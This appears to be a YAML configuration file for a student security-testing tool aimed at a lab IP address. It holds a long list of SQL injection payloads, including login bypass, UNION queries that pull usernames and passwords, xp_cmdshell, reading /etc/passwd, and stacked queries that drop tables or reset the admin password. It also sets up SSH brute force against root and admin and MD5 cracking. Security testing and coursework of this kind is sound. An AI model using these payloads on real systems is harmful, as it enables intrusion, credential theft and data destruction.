# Target configuration
host: "192.168.1.100"  # Target IP address for testing
port: 8080             # Port to test against
url: "http://192.168.1.100"  # Base URL for web-based tests

# Detected open ports (populated after running port scan)
detected_ports: []

# Path to the wordlist file for hash cracking
wordlist: "../../wordlist.txt"  # Path to the external wordlist file

# Test configurations
tests:
  # SQL Injection test configuration
  sqli:
    enabled: true
    payloads:
      # Simple authentication bypass
      - "' OR 1=1 --"
      - "' OR 'a'='a"
      - "' OR ''='"
      - "' OR 1=1#"
      - "' OR 'x'='x'--"
      
      # Error-based SQL Injection (MySQL)
      - "' AND 1=0 UNION SELECT NULL,NULL --"
      - "' UNION SELECT 1,2,3--"
      - "' AND 1=0 UNION SELECT table_name, column_name FROM information_schema.columns --"
      - "' UNION SELECT username, password FROM users --"
      - "' UNION SELECT 1, CONCAT(username, ':', password) FROM users --"
      
      # Union-based SQL Injection
      - "' UNION SELECT NULL,NULL --"
      - "' UNION SELECT 1,2--"
      - "' UNION SELECT version(), database()--"
      - "' UNION SELECT user(),password()--"
      - "' UNION SELECT null,null,null--"
      - "' UNION SELECT username,password FROM users--"
      
      # Blind SQL Injection (True/False based)
      - "' AND 'a'='a' --"
      - "' AND 'a'='b' --"
      - "' AND 1=1 --"
      - "' AND 1=2 --"
      
      # Time-based Blind SQL Injection (MySQL/PostgreSQL)
      - "'; SELECT IF(1=1, SLEEP(5), 0) --"  # MySQL
      - "'; SELECT pg_sleep(5); --"  # PostgreSQL
      - "' OR IF(1=1, SLEEP(5), 0) --"  # MySQL
      - "' OR IF(1=2, SLEEP(5), 0) --"
      
      # Out-of-band SQL Injection (XXE/Blind based attack vectors)
      - "' OR 1=1; EXEC xp_cmdshell('ping 127.0.0.1') --"
      - "' AND load_file('/etc/passwd') --"  # MySQL file access
      
      # Stacked Queries (MySQL/PostgreSQL/MSSQL)
      - "'; DROP TABLE users; --"
      - "'; SELECT * FROM users; DROP TABLE users; --"
      - "'; INSERT INTO users (username, password) VALUES ('attacker', 'password') --"
      
      # Subquery Injection (Advanced)
      - "' OR (SELECT COUNT(*) FROM users) > 0 --"
      - "' OR EXISTS(SELECT * FROM users WHERE username='admin') --"
      
      # Comment-based Injection
      - "' OR 1=1 /*"
      - "' OR 1=1 --"
      - "'; DROP TABLE users; --"
      
      # Information Disclosure
      - "'; SELECT version(); --"
      - "'; SELECT @@version, @@hostname; --"
      
      # Batched Injection (Chaining SQL statements)
      - "'; UPDATE users SET password='newpass' WHERE username='admin'; --"
      - "'; DELETE FROM users WHERE username='admin'; --"
      
      # SQL Injection with Encoding/Obfuscation
      - "'%20OR%201=1 --"  # URL encoded SQLi
      - "' OR ASCII(SUBSTRING((SELECT database()),1,1))>64 --"
      
      
      # Tautologies
      - "' OR 1=1--"
      - "' OR '1'='1'--"
      - "' OR '1'='1' AND '1'='1'--"
      
      # SQL Injection using NULL Byte
      - "'%00 OR 1=1 --"  # NULL byte injection
      - "'%00 OR '1'='1' --"

  # XSS (Cross-Site Scripting) test configuration
  xss:
    enabled: true

  # CSRF (Cross-Site Request Forgery) test configuration
  csrf:
    enabled: true
    new_password: "new_secure_password123"

  # MD5 hash cracking configuration
  md5_cracking:
    enabled: true
    hash_to_crack: "5f4dcc3b5aa765d61d8327deb882cf99"

  # Weak encryption test configuration
  weak_encryption:
    enabled: true

  # C Vulnerabilities (Buffer Overflow, Heap Overflow, etc.) configuration
  c_vulnerability_tests:
    enabled: true

  # SSH brute force test configuration
  ssh_brute_force:
    enabled: true
    usernames:  # List of usernames to test
      - "root"
      - "admin"
      - "user"
      - "test"
      - "guest"
      - "CITS3006"
    wordlist_file: "../../wordlist.txt" 

  # SMB anonymous login test configuration
  smb_anonymous:
    enabled: true

  # Default credentials test configuration
  default_credentials:
    enabled: true

  # Directory traversal test configuration
  directory_traversal:
    enabled: true

  # File upload vulnerability test configuration
  file_upload:
    enabled: true

  # JavaScript and PHP vulnerability test configuration
  js_php_vulnerability_tests:
    enabled: true
